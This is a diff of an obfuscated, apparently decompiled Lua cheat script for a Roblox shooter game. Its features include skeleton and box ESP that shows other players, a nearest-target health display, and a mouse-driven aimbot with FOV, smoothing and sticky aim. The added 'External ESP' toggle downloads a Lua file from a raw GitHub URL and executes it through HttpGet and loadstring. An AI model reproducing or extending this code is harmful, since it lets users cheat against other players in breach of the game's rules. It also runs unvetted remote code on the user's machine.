-                                    v208[v209] = v211
+                                if v208 then
+                                    v204[v205] = v207
                                 else
-                                    v208[v209] = nil
+                                    v204[v205] = nil
                                 end
                             end
                         end
 
                         if esp_settings.enabled then
-                            local v213, v214, v215 = pairs(u174)
+                            local v209, v210, v211 = pairs(u170)
 
                             while true do
-                                local v216
+                                local v212
 
-                                v215, v216 = v213(v214, v215)
+                                v211, v212 = v209(v210, v211)
 
-                                if v215 == nil then
+                                if v211 == nil then
                                     break
                                 end
 
+                                local v213
+
+                                if v204[v211] == nil then
+                                    v213 = false
+                                else
+                                    v213 = esp_settings.skel
+                                end
+
+                                v212.Visible = v213
+                            end
+
+                            local v214, v215, v216 = pairs(u171)
+
+                            while true do
                                 local v217
 
-                                if v208[v215] == nil then
-                                    v217 = false
-                                else
-                                    v217 = esp_settings.skel
-                                end
+                                v216, v217 = v214(v215, v216)
 
-                                v216.Visible = v217
-                            end
-
-                            local v218, v219, v220 = pairs(u175)
-
-                            while true do
-                                local v221
-
-                                v220, v221 = v218(v219, v220)
-
-                                if v220 == nil then
+                                if v216 == nil then
                                     break
                                 end
-                                if v208[v220] then
-                                    if v220 == 'LeftLowerArm' or v220 == 'RightLowerArm' or (v220 == 'LeftLowerLeg' or v220 == 'RightLowerLeg') then
-                                        v221.Position = Vector2.new(v208[v220].X, v208[v220].Y)
-                                        v221.Radius = math.clamp(100 / _Magnitude, 1, 3)
-                                        v221.Visible = true
+                                if v204[v216] then
+                                    if v216 == 'LeftLowerArm' or v216 == 'RightLowerArm' or (v216 == 'LeftLowerLeg' or v216 == 'RightLowerLeg') then
+                                        v217.Position = Vector2.new(v204[v216].X, v204[v216].Y)
+                                        v217.Radius = math.clamp(100 / _Magnitude, 1, 3)
+                                        v217.Visible = true
                                     else
-                                        v221.Visible = false
+                                        v217.Visible = false
                                     end
                                 else
-                                    v221.Visible = false
+                                    v217.Visible = false
                                 end
                             end
 
-                            if esp_settings.show_head_dot and esp_settings.head_dot_type ~= 'none' and v208.Head then
-                                _Circle.Position = Vector2.new(v208.Head.X, v208.Head.Y)
+                            if esp_settings.show_head_dot and esp_settings.head_dot_type ~= 'none' and v204.Head then
+                                _Circle.Position = Vector2.new(v204.Head.X, v204.Head.Y)
                                 _Circle.Radius = math.clamp(300 / _Magnitude, 5, 15)
 
                                 if esp_settings.head_dot_type ~= 'fill' then
@@ -1370,16 +1382,16 @@ local function u252()
                             else
                                 _Circle.Visible = false
                             end
-                            if v208.Head and v208.UpperTorso then
-                                u174.Head.From = Vector2.new(v208.Head.X, v208.Head.Y)
-                                u174.Head.To = Vector2.new(v208.UpperTorso.X, v208.UpperTorso.Y)
+                            if v204.Head and v204.UpperTorso then
+                                u170.Head.From = Vector2.new(v204.Head.X, v204.Head.Y)
+                                u170.Head.To = Vector2.new(v204.UpperTorso.X, v204.UpperTorso.Y)
                             end
-                            if v208.UpperTorso and v208.LowerTorso then
-                                u174.UpperTorso.From = Vector2.new(v208.UpperTorso.X, v208.UpperTorso.Y)
-                                u174.UpperTorso.To = Vector2.new(v208.LowerTorso.X, v208.LowerTorso.Y)
+                            if v204.UpperTorso and v204.LowerTorso then
+                                u170.UpperTorso.From = Vector2.new(v204.UpperTorso.X, v204.UpperTorso.Y)
+                                u170.UpperTorso.To = Vector2.new(v204.LowerTorso.X, v204.LowerTorso.Y)
                             end
 
-                            local v222, v223, v224 = pairs({
+                            local v218, v219, v220 = pairs({
                                 {
                                     'UpperTorso',
                                     'LeftUpperArm',
@@ -1415,6 +1427,22 @@ local function u252()
                             })
 
                             while true do
+                                local v221
+
+                                v220, v221 = v218(v219, v220)
+
+                                if v220 == nil then
+                                    break
+                                end
+                                if v204[v221[1] ] and v204[v221[2] ] then
+                                    u170[v221[2] ].From = Vector2.new(v204[v221[1] ].X, v204[v221[1] ].Y)
+                                    u170[v221[2] ].To = Vector2.new(v204[v221[2] ].X, v204[v221[2] ].Y)
+                                end
+                            end
+                        else
+                            local v222, v223, v224 = pairs(u170)
+
+                            while true do
                                 local v225
 
                                 v224, v225 = v222(v223, v224)
@@ -1422,13 +1450,11 @@ local function u252()
                                 if v224 == nil then
                                     break
                                 end
-                                if v208[v225[1] ] and v208[v225[2] ] then
-                                    u174[v225[2] ].From = Vector2.new(v208[v225[1] ].X, v208[v225[1] ].Y)
-                                    u174[v225[2] ].To = Vector2.new(v208[v225[2] ].X, v208[v225[2] ].Y)
-                                end
+
+                                v225.Visible = false
                             end
-                        else
-                            local v226, v227, v228 = pairs(u174)
+
+                            local v226, v227, v228 = pairs(u171)
 
                             while true do
                                 local v229
@@ -1442,26 +1468,26 @@ local function u252()
                                 v229.Visible = false
                             end
 
-                            local v230, v231, v232 = pairs(u175)
-
-                            while true do
-                                local v233
-
-                                v232, v233 = v230(v231, v232)
-
-                                if v232 == nil then
-                                    break
-                                end
-
-                                v233.Visible = false
-                            end
-
                             _Circle.Visible = false
                         end
                     else
-                        u179:Disconnect()
+                        u175:Disconnect()
 
-                        local v234, v235, v236 = pairs(u174)
+                        local v230, v231, v232 = pairs(u170)
+
+                        while true do
+                            local v233
+
+                            v232, v233 = v230(v231, v232)
+
+                            if v232 == nil then
+                                break
+                            end
+
+                            v233.Visible = false
+                        end
+
+                        local v234, v235, v236 = pairs(u171)
 
                         while true do
                             local v237
@@ -1475,85 +1501,116 @@ local function u252()
                             v237.Visible = false
                         end
 
-                        local v238, v239, v240 = pairs(u175)
-
-                        while true do
-                            local v241
-
-                            v240, v241 = v238(v239, v240)
-
-                            if v240 == nil then
-                                break
-                            end
-
-                            v241.Visible = false
-                        end
-
                         _Circle.Visible = false
                     end
                 end)
             end
 
-            coroutine.wrap(v242)()
+            coroutine.wrap(v238)()
         end
-        local function v246(p244)
-            if p244.Character then
-                coroutine.wrap(u243)(p244, p244.Character)
+        local function v242(p240)
+            if p240.Character then
+                coroutine.wrap(u239)(p240, p240.Character)
             end
 
-            p244.CharacterAdded:Connect(function(p245)
-                coroutine.wrap(u243)(p244, p245)
+            p240.CharacterAdded:Connect(function(p241)
+                coroutine.wrap(u239)(p240, p241)
             end)
         end
 
-        local v247 = _Players2
-        local v248, v249, v250 = ipairs(v247:GetPlayers())
+        local v243 = _Players2
+        local v244, v245, v246 = ipairs(v243:GetPlayers())
 
         while true do
-            local v251
+            local v247
 
-            v250, v251 = v248(v249, v250)
+            v246, v247 = v244(v245, v246)
 
-            if v250 == nil then
+            if v246 == nil then
                 break
             end
-            if v251 ~= _LocalPlayer3 then
-                v246(v251)
+            if v247 ~= _LocalPlayer3 then
+                v242(v247)
             end
         end
 
-        _Players2.PlayerAdded:Connect(v246)
+        _Players2.PlayerAdded:Connect(v242)
 
-        u167 = true
+        u163 = true
     end
 end
 
-u69.Main:AddSection('Skeleton')
+u67.Main:AddSection("External Features (Recomended)")
 
-local _espenabled = u69.Main:AddToggle('espenabled', {
+local ESP_URL = "https://raw.githubusercontent.com/ALPHAneegy/rivalsPremuim/refs/heads/main/esp.lua"
+local espLoaded = false
+
+u67.Main:AddToggle("ExternalESP", {
+    Title = "External ESP",
+    Description = "Carga el ESP externo",
+    Default = false,
+}):OnChanged(function(enabled)
+    if enabled and not espLoaded then
+        local success, err = pcall(function()
+            local source = game:HttpGet(ESP_URL)
+            local fn = loadstring(source)
+
+            if not fn then
+                error("No se pudo compilar esp.lua")
+            end
+
+            fn()
+        end)
+
+        if success then
+            espLoaded = true
+        else
+            warn("Error cargando ESP:", err)
+        end
+    end
+end)
+
+
+u67.Main:AddSection('Skeleton')
+
+local _espenabled = u67.Main:AddToggle('espenabled', {
     Title = 'Enable ESP',
     Default = esp_settings.enabled,
 })
-local v254 = _espenabled
+local v250 = _espenabled
 
-_espenabled.OnChanged(v254, function()
+_espenabled.OnChanged(v250, function()
     esp_settings.enabled = _espenabled.Value
 
     if esp_settings.enabled then
-        u252()
+        u248()
     else
-        local v255, v256, v257 = pairs(u166)
+        local v251, v252, v253 = pairs(u162)
 
         while true do
-            local v258
+            local v254
 
-            v257, v258 = v255(v256, v257)
+            v253, v254 = v251(v252, v253)
 
-            if v257 == nil then
+            if v253 == nil then
                 break
             end
 
-            local v259, v260, v261 = pairs(v258.bones)
+            local v255, v256, v257 = pairs(v254.bones)
+
+            while true do
+                local v258
+
+                v257, v258 = v255(v256, v257)
+
+                if v257 == nil then
+                    break
+                end
+
+                v258.Visible = false
+            end
+
+            local v259, v260, v261 = pairs(v254.dots)
 
             while true do
                 local v262
@@ -1567,55 +1624,41 @@ _espenabled.OnChanged(v254, function()
                 v262.Visible = false
             end
 
-            local v263, v264, v265 = pairs(v258.dots)
-
-            while true do
-                local v266
-
-                v265, v266 = v263(v264, v265)
-
-                if v265 == nil then
-                    break
-                end
-
-                v266.Visible = false
-            end
-
-            if v258.head_dot then
-                v258.head_dot.Visible = false
+            if v254.head_dot then
+                v254.head_dot.Visible = false
             end
         end
     end
 end)
 
-local _headdot = u69.Main:AddToggle('headdot', {
+local _headdot = u67.Main:AddToggle('headdot', {
     Title = 'Enable Head Dot',
     Default = esp_settings.show_head_dot,
 })
-local v268 = _headdot
+local v264 = _headdot
 
-_headdot.OnChanged(v268, function()
+_headdot.OnChanged(v264, function()
     esp_settings.show_head_dot = _headdot.Value
 
     if esp_settings.show_head_dot then
-        u252()
+        u248()
     else
-        local v269, v270, v271 = pairs(u166)
+        local v265, v266, v267 = pairs(u162)
 
         while true do
-            local v272
+            local v268
 
-            v271, v272 = v269(v270, v271)
+            v267, v268 = v265(v266, v267)
 
-            if v271 == nil then
+            if v267 == nil then
                 break
             end
 
-            v272.head_dot.Visible = false
+            v268.head_dot.Visible = false
         end
     end
 end)
-u69.Main:AddDropdown('HeadDotDropdown', {
+u67.Main:AddDropdown('HeadDotDropdown', {
     Title = 'Head Dot Dropdown',
     Values = {
         'none',
@@ -1624,52 +1667,55 @@ u69.Main:AddDropdown('HeadDotDropdown', {
     },
     Multi = false,
     Default = 2,
-}):OnChanged(function(p273)
-    esp_settings.head_dot_type = p273
+}):OnChanged(function(p269)
+    esp_settings.head_dot_type = p269
 
     if esp_settings.enabled then
-        u252()
+        u248()
     end
 end)
-u69.Main:AddSection('Box Esp')
+u67.Main:AddSection('Box Esp')
 
-local _FullBoxesToggle = u69.Main:AddToggle('FullBoxesToggle', {
+u81.Drawing.Boxes.Full.Enabled = false
+u81.Drawing.Boxes.Filled.Enabled = false
+
+local _FullBoxesToggle = u67.Main:AddToggle('FullBoxesToggle', {
     Title = 'Toggle Full Boxes',
-    Default = u85.Drawing.Boxes.Full.Enabled,
+    Default = u81.Drawing.Boxes.Full.Enabled,
 })
-local v275 = _FullBoxesToggle
+local v271 = _FullBoxesToggle
 
-_FullBoxesToggle.OnChanged(v275, function()
-    u85.Drawing.Boxes.Full.Enabled = _FullBoxesToggle.Value
+_FullBoxesToggle.OnChanged(v271, function()
+    u81.Drawing.Boxes.Full.Enabled = _FullBoxesToggle.Value
 end)
 
-local _FilledBoxesToggle = u69.Main:AddToggle('FilledBoxesToggle', {
+local _FilledBoxesToggle = u67.Main:AddToggle('FilledBoxesToggle', {
     Title = 'Toggle Filled Boxes',
-    Default = u85.Drawing.Boxes.Filled.Enabled,
+    Default = u81.Drawing.Boxes.Filled.Enabled,
 })
-local v277 = _FilledBoxesToggle
+local v273 = _FilledBoxesToggle
 
-_FilledBoxesToggle.OnChanged(v277, function()
+_FilledBoxesToggle.OnChanged(v273, function()
     if _FilledBoxesToggle.Value then
-        u85.Drawing.Boxes.Filled.Transparency = 0.7
+        u81.Drawing.Boxes.Filled.Transparency = 0.7
     else
-        u85.Drawing.Boxes.Filled.Transparency = 1
+        u81.Drawing.Boxes.Filled.Transparency = 1
     end
 end)
-u69.Main:AddToggle('Rainbowbox', {
+u67.Main:AddToggle('Rainbowbox', {
     Title = 'Rainbow Box',
     Default = false,
-}):OnChanged(function(p278)
-    if p278 then
+}):OnChanged(function(p274)
+    if p274 then
         local _RunService3 = game:GetService('RunService')
 
         rainbowRunning = true
 
         _RunService3.Heartbeat:Connect(function()
             if rainbowRunning then
-                local v280 = tick() % 5
+                local v276 = tick() % 5
 
-                getgenv().boxBorderColor = Color3.fromHSV(v280 / 5, 1, 1)
+                getgenv().boxBorderColor = Color3.fromHSV(v276 / 5, 1, 1)
             end
         end)
     else
@@ -1791,38 +1837,38 @@ task.spawn(function()
     _UICorner6.CornerRadius = UDim.new(0, 3)
     _UICorner6.Parent = _Frame7
 
-    local u302 = nil
-    local u303 = nil
-    local u304 = false
+    local u298 = nil
+    local u299 = nil
+    local u300 = false
 
-    local function u317()
+    local function u313()
         local _huge = math.huge
-        local v306 = _Players3
-        local v307, v308, v309 = ipairs(v306:GetPlayers())
-        local v310 = nil
+        local v302 = _Players3
+        local v303, v304, v305 = ipairs(v302:GetPlayers())
+        local v306 = nil
 
         while true do
-            local v311
+            local v307
 
-            v309, v311 = v307(v308, v309)
+            v305, v307 = v303(v304, v305)
 
-            if v309 == nil then
+            if v305 == nil then
                 break
             end
-            if v311 ~= _LocalPlayer4 and v311.Character then
-                local _Character2 = v311.Character
+            if v307 ~= _LocalPlayer4 and v307.Character then
+                local _Character2 = v307.Character
                 local _HumanoidRootPart5 = _Character2:FindFirstChild('HumanoidRootPart')
                 local _Humanoid4 = _Character2:FindFirstChild('Humanoid')
 
                 if _HumanoidRootPart5 and _Humanoid4 and (_Humanoid4.Health > 0 and not _HumanoidRootPart5:FindFirstChild('TeammateLabel')) then
-                    local _, v315 = _CurrentCamera4:WorldToViewportPoint(_HumanoidRootPart5.Position)
+                    local _, v311 = _CurrentCamera4:WorldToViewportPoint(_HumanoidRootPart5.Position)
 
-                    if v315 then
+                    if v311 then
                         local _Magnitude2 = (_HumanoidRootPart5.Position - _LocalPlayer4.Character.HumanoidRootPart.Position).Magnitude
 
                         if _Magnitude2 <= 350 then
                             if _Magnitude2 < _huge then
-                                v310 = v311
+                                v306 = v307
                                 _huge = _Magnitude2
                             end
                         end
@@ -1831,52 +1877,52 @@ task.spawn(function()
             end
         end
 
-        return v310
+        return v306
     end
-    local function v328()
-        if u304 and getgenv().state == 2 then
+    local function v324()
+        if u300 and getgenv().state == 2 then
             if _LocalPlayer4.Character and (_LocalPlayer4.Character:FindFirstChild('Humanoid') and _LocalPlayer4.Character.Humanoid.Health > 0) then
-                local v318 = u317()
+                local v314 = u313()
 
-                if v318 then
+                if v314 then
                     _ScreenGui2.Enabled = true
-                    _TextLabel2.Text = v318.DisplayName
+                    _TextLabel2.Text = v314.DisplayName
 
-                    local v319, v320 = _Players3:GetUserThumbnailAsync(v318.UserId, Enum.ThumbnailType.AvatarBust, Enum.ThumbnailSize.Size150x150)
+                    local v315, v316 = _Players3:GetUserThumbnailAsync(v314.UserId, Enum.ThumbnailType.AvatarBust, Enum.ThumbnailSize.Size150x150)
 
-                    _ImageLabel2.Image = v320 and v319 and v319 or 'rbxassetid://13456566776'
+                    _ImageLabel2.Image = v316 and v315 and v315 or 'rbxassetid://13456566776'
 
-                    local _Humanoid5 = v318.Character:FindFirstChild('Humanoid')
+                    local _Humanoid5 = v314.Character:FindFirstChild('Humanoid')
 
                     if _Humanoid5 then
-                        local v322 = _Humanoid5.Health / _Humanoid5.MaxHealth
-                        local u323 = UDim2.new(v322, 0, 1, 0)
-                        local v324 = Color3.fromRGB(0, 255, 0)
+                        local v318 = _Humanoid5.Health / _Humanoid5.MaxHealth
+                        local u319 = UDim2.new(v318, 0, 1, 0)
+                        local v320 = Color3.fromRGB(0, 255, 0)
 
                         if _Humanoid5.Health <= 30 then
-                            v324 = Color3.fromRGB(255, 255, 0)
+                            v320 = Color3.fromRGB(255, 255, 0)
                         end
                         if _Humanoid5.Health <= 15 then
-                            v324 = Color3.fromRGB(255, 0, 0)
+                            v320 = Color3.fromRGB(255, 0, 0)
                         end
 
-                        local v325 = _TweenService:Create(_Frame8, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = u323})
-                        local v326 = _TweenService:Create(_Frame8, TweenInfo.new(0.3), {BackgroundColor3 = v324})
+                        local v321 = _TweenService:Create(_Frame8, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = u319})
+                        local v322 = _TweenService:Create(_Frame8, TweenInfo.new(0.3), {BackgroundColor3 = v320})
 
-                        v325:Play()
-                        v326:Play()
+                        v321:Play()
+                        v322:Play()
                         task.delay(0.8, function()
-                            local v327 = {Size = u323}
+                            local v323 = {Size = u319}
 
-                            _TweenService:Create(_Frame7, TweenInfo.new(0.3), v327):Play()
+                            _TweenService:Create(_Frame7, TweenInfo.new(0.3), v323):Play()
                         end)
 
-                        u302 = _Humanoid5.Health
-                        u303 = v318
+                        u298 = _Humanoid5.Health
+                        u299 = v314
                     end
                 else
                     _ScreenGui2.Enabled = false
-                    u303 = nil
+                    u299 = nil
                 end
             else
                 _ScreenGui2.Enabled = false
@@ -1888,99 +1934,100 @@ task.spawn(function()
         end
     end
 
-    _RunService4.RenderStepped:Connect(v328)
-    u69.Settings:AddToggle('targetstat', {
+    _RunService4.RenderStepped:Connect(v324)
+    u67.Settings:AddToggle('targetstat', {
         Title = 'Target status',
         Default = true,
     }):OnChanged(function()
-        u304 = _Options.targetstat.Value
+        u300 = _Options.targetstat.Value
     end)
 end)
+u67.Skinz:AddSection('Mouse Aimbot [v2]')
 
 function InitializeAimbot2()
-    local u329 = false
+    local u325 = false
     local _MouseButton2 = Enum.UserInputType.MouseButton2
-    local u331 = 'Head'
-    local u332 = 100
-    local u333 = 5
+    local u327 = 'Head'
+    local u328 = 100
+    local u329 = 5
+    local u330 = false
+    local u331 = false
+    local u332 = 0
+    local u333 = 0
     local u334 = false
     local u335 = false
-    local u336 = 0
-    local u337 = 0
-    local u338 = false
-    local u339 = false
-    local u340 = nil
+    local u336 = nil
     local _RunService5 = game:GetService('RunService')
     local _UserInputService = game:GetService('UserInputService')
     local _Players4 = game:GetService('Players')
     local _LocalPlayer5 = _Players4.LocalPlayer
     local _CurrentCamera5 = workspace.CurrentCamera
 
-    local function u357()
-        local v346 = u332
-        local v347 = Vector2.new(_CurrentCamera5.ViewportSize.X / 2, _CurrentCamera5.ViewportSize.Y / 2)
-        local v348 = _Players4
-        local v349, v350, v351 = pairs(v348:GetPlayers())
-        local v352 = nil
+    local function u353()
+        local v342 = u328
+        local v343 = Vector2.new(_CurrentCamera5.ViewportSize.X / 2, _CurrentCamera5.ViewportSize.Y / 2)
+        local v344 = _Players4
+        local v345, v346, v347 = pairs(v344:GetPlayers())
+        local v348 = nil
 
         while true do
-            local v353
+            local v349
 
-            v351, v353 = v349(v350, v351)
+            v347, v349 = v345(v346, v347)
 
-            if v351 == nil then
+            if v347 == nil then
                 break
             end
-            if v353 ~= _LocalPlayer5 and v353.Character and v353.Character:FindFirstChild(u331) then
-                local v354, v355 = _CurrentCamera5:WorldToViewportPoint(v353.Character[u331].Position)
+            if v349 ~= _LocalPlayer5 and v349.Character and v349.Character:FindFirstChild(u327) then
+                local v350, v351 = _CurrentCamera5:WorldToViewportPoint(v349.Character[u327].Position)
 
-                if v355 then
-                    local _Magnitude3 = (Vector2.new(v354.X, v354.Y) - v347).Magnitude
+                if v351 then
+                    local _Magnitude3 = (Vector2.new(v350.X, v350.Y) - v343).Magnitude
 
-                    if _Magnitude3 < v346 then
-                        v352 = v353
-                        v346 = _Magnitude3
+                    if _Magnitude3 < v342 then
+                        v348 = v349
+                        v342 = _Magnitude3
                     end
                 end
             end
         end
 
-        return v352
+        return v348
     end
-    local function v368()
-        if u329 then
+    local function v364()
+        if u325 then
             local _ = getgenv().state == 2
 
             if _MouseButton2 ~= Enum.UserInputType.MouseButton2 then
                 if not _UserInputService:IsKeyDown(_MouseButton2) then
-                    u340 = nil
+                    u336 = nil
 
                     return
                 end
             elseif not _UserInputService:IsMouseButtonPressed(_MouseButton2) then
-                u340 = nil
+                u336 = nil
 
                 return
             end
-            if u340 and u338 and u340.Character and u340.Character:FindFirstChild(u331) then
-                local v358 = _CurrentCamera5:WorldToViewportPoint(u340.Character[u331].Position)
-                local v359 = Vector2.new(v358.X, v358.Y)
-                local v360 = Vector2.new(_CurrentCamera5.ViewportSize.X / 2, _CurrentCamera5.ViewportSize.Y / 2)
-                local v361 = v359 - v360
-                local v362 = Vector2.new(v360.X + v361.X / (u333 + 1), v360.Y + v361.Y / (u333 + 1)) - Vector2.new(_CurrentCamera5.ViewportSize.X / 2, _CurrentCamera5.ViewportSize.Y / 2)
+            if u336 and u334 and u336.Character and u336.Character:FindFirstChild(u327) then
+                local v354 = _CurrentCamera5:WorldToViewportPoint(u336.Character[u327].Position)
+                local v355 = Vector2.new(v354.X, v354.Y)
+                local v356 = Vector2.new(_CurrentCamera5.ViewportSize.X / 2, _CurrentCamera5.ViewportSize.Y / 2)
+                local v357 = v355 - v356
+                local v358 = Vector2.new(v356.X + v357.X / (u329 + 1), v356.Y + v357.Y / (u329 + 1)) - Vector2.new(_CurrentCamera5.ViewportSize.X / 2, _CurrentCamera5.ViewportSize.Y / 2)
 
-                mousemoverel(v362.X, v362.Y)
+                mousemoverel(v358.X, v358.Y)
             else
-                u340 = u357()
+                u336 = u353()
 
-                if u340 then
-                    local v363 = _CurrentCamera5:WorldToViewportPoint(u340.Character[u331].Position)
-                    local v364 = Vector2.new(v363.X, v363.Y)
-                    local v365 = Vector2.new(_CurrentCamera5.ViewportSize.X / 2, _CurrentCamera5.ViewportSize.Y / 2)
-                    local v366 = v364 - v365
-                    local v367 = Vector2.new(v365.X + v366.X / (u333 + 1), v365.Y + v366.Y / (u333 + 1)) - Vector2.new(_CurrentCamera5.ViewportSize.X / 2, _CurrentCamera5.ViewportSize.Y / 2)
+                if u336 then
+                    local v359 = _CurrentCamera5:WorldToViewportPoint(u336.Character[u327].Position)
+                    local v360 = Vector2.new(v359.X, v359.Y)
+                    local v361 = Vector2.new(_CurrentCamera5.ViewportSize.X / 2, _CurrentCamera5.ViewportSize.Y / 2)
+                    local v362 = v360 - v361
+                    local v363 = Vector2.new(v361.X + v362.X / (u329 + 1), v361.Y + v362.Y / (u329 + 1)) - Vector2.new(_CurrentCamera5.ViewportSize.X / 2, _CurrentCamera5.ViewportSize.Y / 2)
 
-                    mousemoverel(v367.X, v367.Y)
+                    mousemoverel(v363.X, v363.Y)
                 end
             end
         else
@@ -1995,94 +2042,94 @@ function InitializeAimbot2()
     _Circle2.Transparency = 1
     _Circle2.Filled = false
 
-    local function v371()
-        if u339 then
-            local v370 = _UserInputService:GetMouseLocation()
+    local function v367()
+        if u335 then
+            local v366 = _UserInputService:GetMouseLocation()
 
-            _Circle2.Radius = u332
-            _Circle2.Position = Vector2.new(v370.X, v370.Y)
+            _Circle2.Radius = u328
+            _Circle2.Position = Vector2.new(v366.X, v366.Y)
             _Circle2.Visible = true
         else
             _Circle2.Visible = false
         end
     end
 
-    local v377 = {
+    local v373 = {
         {
             'EnableAimbot2',
             'Enable',
             false,
-            function(p372)
-                u329 = p372
+            function(p368)
+                u325 = p368
             end,
         },
         {
             'ShowFOVCheckbox2',
             'Show FOV',
             false,
-            function(p373)
-                u339 = p373
+            function(p369)
+                u335 = p369
             end,
         },
         {
             'SmoothnessCheckbox2',
             'Smoothness',
             false,
-            function(p374)
-                u334 = p374
+            function(p370)
+                u330 = p370
             end,
         },
         {
             'EnablePrediction2',
             'Enable Prediction',
             false,
-            function(p375)
-                u335 = p375
+            function(p371)
+                u331 = p371
             end,
         },
         {
             'StickyAimCheckbox2',
             'Sticky Aim',
             false,
-            function(p376)
-                u338 = p376
+            function(p372)
+                u334 = p372
             end,
         },
     }
-    local v378, v379, v380 = ipairs(v377)
-    local u381 = u333
-    local u382 = u332
-    local u383 = u331
-    local u384 = _MouseButton2
+    local v374, v375, v376 = ipairs(v373)
+    local u377 = u329
+    local u378 = u328
+    local u379 = u327
+    local u380 = _MouseButton2
 
     while true do
-        local v385
+        local v381
 
-        v380, v385 = v378(v379, v380)
+        v376, v381 = v374(v375, v376)
 
-        if v380 == nil then
+        if v376 == nil then
             break
         end
 
-        u69.AimTab:AddToggle(v385[1], {
-            Title = v385[2],
-            Default = v385[3],
-        }):OnChanged(v385[4])
+        u67.AimTab:AddToggle(v381[1], {
+            Title = v381[2],
+            Default = v381[3],
+        }):OnChanged(v381[4])
     end
 
-    u69.AimTab:AddKeybind('Keybind2', {
+    u67.AimTab:AddKeybind('Keybind2', {
         Title = 'Keybind',
         Mode = 'Toggle',
         Default = 'MouseButton2',
-        ChangedCallback = function(p386)
-            if p386 == Enum.KeyCode.Unknown then
-                p386 = Enum.UserInputType.MouseButton2 or p386
+        ChangedCallback = function(p382)
+            if p382 == Enum.KeyCode.Unknown then
+                p382 = Enum.UserInputType.MouseButton2 or p382
             end
 
-            u384 = p386
+            u380 = p382
         end,
     })
-    u69.AimTab:AddDropdown('AimPartDropDown2', {
+    u67.AimTab:AddDropdown('AimPartDropDown2', {
         Title = 'Aim At',
         Values = {
             'Head',
@@ -2091,12 +2138,12 @@ function InitializeAimbot2()
         },
         Multi = false,
         Default = 1,
-        Callback = function(p387)
-            u383 = p387
+        Callback = function(p383)
+            u379 = p383
         end,
     })
 
-    local v392, v393, v394 = ipairs({
+    local v388, v389, v390 = ipairs({
         {
             'FOVSizeSlider2',
             'FOV Size',
@@ -2104,8 +2151,8 @@ function InitializeAimbot2()
             0,
             900,
             0,
-            function(p388)
-                u382 = p388
+            function(p384)
+                u378 = p384
             end,
         },
         {
@@ -2115,8 +2162,8 @@ function InitializeAimbot2()
             0,
             20,
             1,
-            function(p389)
-                u381 = p389
+            function(p385)
+                u377 = p385
             end,
         },
         {
@@ -2126,8 +2173,8 @@ function InitializeAimbot2()
             0,
             1,
             2,
-            function(p390)
-                u336 = p390
+            function(p386)
+                u332 = p386
             end,
         },
         {
@@ -2137,109 +2184,109 @@ function InitializeAimbot2()
             0,
             1,
             2,
-            function(p391)
-                u337 = p391
+            function(p387)
+                u333 = p387
             end,
         },
     })
 
     while true do
-        local v395
+        local v391
 
-        v394, v395 = v392(v393, v394)
+        v390, v391 = v388(v389, v390)
 
-        if v394 == nil then
+        if v390 == nil then
             break
         end
 
-        u69.AimTab:AddSlider(v395[1], {
-            Title = v395[2],
-            Default = v395[3],
-            Min = v395[4],
-            Max = v395[5],
-            Rounding = v395[6],
-            Callback = v395[7],
+        u67.AimTab:AddSlider(v391[1], {
+            Title = v391[2],
+            Default = v391[3],
+            Min = v391[4],
+            Max = v391[5],
+            Rounding = v391[6],
+            Callback = v391[7],
         })
     end
 
-    _RunService5.RenderStepped:Connect(v368)
-    _RunService5.RenderStepped:Connect(v371)
+    _RunService5.RenderStepped:Connect(v364)
+    _RunService5.RenderStepped:Connect(v367)
 end
 
 InitializeAimbot2()
 
 function InitializeAimbotUI2()
-    local v401, v402, v403 = ipairs({
+    local v397, v398, v399 = ipairs({
         {
             'EnableAimbot2',
             'Enable Aimbot',
             false,
-            function(p396)
-                aimbotEnabled2 = p396
+            function(p392)
+                aimbotEnabled2 = p392
             end,
         },
         {
             'ShowFOV2',
             'Show FOV',
             false,
-            function(p397)
-                showFOV2 = p397
+            function(p393)
+                showFOV2 = p393
             end,
         },
         {
             'Smoothness2',
             'Smoothness',
             false,
-            function(p398)
-                aimbotSmoothnessEnabled2 = p398
+            function(p394)
+                aimbotSmoothnessEnabled2 = p394
             end,
         },
         {
             'EnablePrediction2',
             'Enable Prediction',
             false,
-            function(p399)
-                aimbotPredictionEnabled2 = p399
+            function(p395)
+                aimbotPredictionEnabled2 = p395
             end,
         },
         {
             'StickyAim2',
             'Sticky Aim',
             false,
-            function(p400)
-                aimbotStickyAimEnabled2 = p400
+            function(p396)
+                aimbotStickyAimEnabled2 = p396
             end,
         },
     })
 
     while true do
-        local v404
+        local v400
 
-        v403, v404 = v401(v402, v403)
+        v399, v400 = v397(v398, v399)
 
-        if v403 == nil then
+        if v399 == nil then
             break
         end
 
-        u69.AimTab:AddToggle(v404[1], {
-            Title = v404[2],
-            Default = v404[3],
-        }):OnChanged(v404[4])
+        u67.AimTab:AddToggle(v400[1], {
+            Title = v400[2],
+            Default = v400[3],
+        }):OnChanged(v400[4])
     end
 
-    u69.AimTab:AddKeybind('Keybind2', {
+    u67.AimTab:AddKeybind('Keybind2', {
         Title = 'Keybind',
         Mode = 'Toggle',
         Default = 'MouseButton2',
-        ChangedCallback = function(p405)
-            if p405 == Enum.KeyCode.Unknown then
-                p405 = Enum.UserInputType.MouseButton2 or p405
+        ChangedCallback = function(p401)
+            if p401 == Enum.KeyCode.Unknown then
+                p401 = Enum.UserInputType.MouseButton2 or p401
             end
 
-            aimbotKeybind2 = p405
+            aimbotKeybind2 = p401
         end,
     })
-    u69.AimTab:AddDropdown('AimAtDropdown2', {
+    u67.AimTab:AddDropdown('AimAtDropdown2', {
         Title = 'Aim focus',
         Values = {
             'Head',
@@ -2248,12 +2295,12 @@ function InitializeAimbotUI2()
         },
         Multi = false,
         Default = 1,
-        Callback = function(p406)
-            aimbotAimPart2 = p406
+        Callback = function(p402)
+            aimbotAimPart2 = p402
         end,
     })
 
-    local v409, v410, v411 = ipairs({
+    local v405, v406, v407 = ipairs({
         {
             'FovSizeSlider2',
             'FOV Size',
@@ -2261,8 +2308,8 @@ function InitializeAimbotUI2()
             0,
             900,
             0,
-            function(p407)
-                aimbotFOVSize2 = p407
+            function(p403)
+                aimbotFOVSize2 = p403
             end,
         },
         {
@@ -2272,28 +2319,28 @@ function InitializeAimbotUI2()
             0,
             10,
             1,
-            function(p408)
-                aimbotSmoothness2 = p408
+            function(p404)
+                aimbotSmoothness2 = p404
             end,
         },
     })
 
     while true do
-        local v412
+        local v408
 
-        v411, v412 = v409(v410, v411)
+        v407, v408 = v405(v406, v407)
 
